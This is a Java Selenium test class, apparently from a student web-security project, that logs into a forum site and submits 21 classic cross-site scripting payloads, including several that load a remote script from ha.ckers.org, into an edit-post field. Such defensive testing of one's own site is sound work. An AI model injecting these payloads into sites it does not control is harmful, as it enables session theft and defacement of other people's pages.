/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package com.mycompany.ict3103busbly;

//import java.io.ByteArrayOutputStream;
//import java.io.PrintStream;
import org.junit.Before;
import org.junit.Test;
import org.junit.After;
import static org.junit.Assert.*;
import org.openqa.selenium.Alert;

import org.openqa.selenium.By;
import org.openqa.selenium.WebDriver;
import org.openqa.selenium.WebElement;
import org.openqa.selenium.chrome.ChromeDriver;
import org.openqa.selenium.firefox.FirefoxDriver;
import org.openqa.selenium.htmlunit.HtmlUnitDriver;
import org.openqa.selenium.support.ui.ExpectedConditions;
import org.openqa.selenium.support.ui.WebDriverWait;

/**
 *
 * @author pheeb
 */
public class EditPostXSSTest {
    
	WebDriver driver = new HtmlUnitDriver(true); 
    WebDriverWait wait; 
    String url = "https://teamname.sitict.net/createPost.php";
    
    
    String email = "testemail@email.com";
    String password = "Password111!";
    
    
    
    
    
    String xss1 = "<script>alert(1)</script>";
    String xss2 = "';alert(String.fromCharCode(88,83,83))//\\';alert(String.fromCharCode(88,83,83))//\";alert(String.fromCharCode(88,83,83))//\\\";alert(String.fromCharCode<script>alert('xss')</script>";
    String xss3 = "//--></SCRIPT>\">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>";
    String xss4 = "'';!--\"<XSS>=&{()}";
    String xss5 ="<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>";
    String xss6 ="<IMG SRC=\"javascript:alert('XSS');\">;";
    String xss7 ="<IMG SRC=javascript:alert('XSS')>";
    String xss8 ="<IMG SRC=javascrscriptipt:alert('XSS')>";
    String xss9 ="<IMG SRC=JaVaScRiPt:alert('XSS')>";
    String xss10 ="<IMG \"\"\"><SCRIPT>alert(\"XSS\")</SCRIPT>\">";
    String xss11 ="IMG SRC=\" &#14;  javascript:alert('XSS');\">";
    String xss12 ="<SCRIPT/XSS SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
    String xss13 ="<SCRIPT/SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>";
    String xss14 ="<<SCRIPT>alert(\"XSS\");//<</SCRIPT>";
    String xss15 ="<SCRIPT>a=/XSS/alert(a.source)</SCRIPT>";
    String xss16 ="\\\";alert('XSS');//";
    String xss17 ="</TITLE><SCRIPT>alert(\"XSS\");</SCRIPT>";
    String xss18 ="<TABLE><TD BACKGROUND=\"javascript:alert('XSS')\">";
    String xss19 ="<DIV STYLE=\"background-image: url(javascript:alert('XSS'))\">";
    String xss20 ="<DIV STYLE=\"background-image:\\0075\\0072\\006C\\0028'\\006a\\0061\\0076\\0061\\0073\\0063\\0072\\0069\\0070\\0074\\003a\\0061\\006c\\0065\\0072\\0074\\0028.1027\\0058.1053\\0053\\0027\\0029'\\0029\">";
    String xss21 ="<DIV STYLE=\"width: expression(alert('XSS'));\">";
    		
   
    
    
    
@Before
    public void setUp() { 
		driver = new HtmlUnitDriver(); 
		wait = new WebDriverWait(driver, 30); 
	} 

@After
    public void tearDown() { 
		driver.quit(); 
	}	 
   
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss1() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss1);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss2() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss2);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss3() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss3);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss4() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss4);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss5() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss5);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss6() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss6);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss7() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss7);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss8() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss8);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss9() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss9);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss10() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss10);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss11() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss11);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss12() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss12);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss13() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss13);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss14() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss14);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss15() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss15);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss16() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss16);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss17() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss17);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss18() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss18);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss19() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss19);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page
    public void test_edit_post_xss20() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss20);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    @Test
    //Expected result: if xss script is detected, then
    //                 stay on same page 
    public void test_edit_post_xss21() 
    		throws InterruptedException { 

		//get web page
		driver.get(url);
		//wait until page is loaded or timeout error
		wait.until(ExpectedConditions.titleContains("Busbly Login")); 
		
		driver.findElement(By.name("email")).sendKeys(email);
        driver.findElement(By.name("password_1")).sendKeys(password);
        //click submit
        driver.findElement(By.name("login_user")).submit();
 
        
        //get to create new topic page
        wait.until(ExpectedConditions.titleContains("Busbly Forum")); 
        
        //select topic
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr[5]/td[1]/form/input")).click();
        System.out.println(driver.getCurrentUrl());
        
        //select thread 
        driver.findElement(By.name("Thread")).click();
        System.out.println(driver.getCurrentUrl());
        //select edit post
        driver.findElement(By.xpath("//*[@id=\"dtBasicExample\"]/tbody/tr/td[3]/div/form[1]/button")).submit();
		
		//enter input
		//use each and every possible SQL statement and inject on PostComment field and submit
		driver.findElement(By.name("PostComment")).sendKeys(xss21);
		//click submit
		driver.findElement(By.name("submit")).click();
                
                //check result 
		String expectedResult = "Busbly Forum"; 
		boolean isResultCorrect = wait.until(ExpectedConditions.titleContains(expectedResult)); 
		assertTrue(isResultCorrect == true); 
   }
    
    
    
    
}
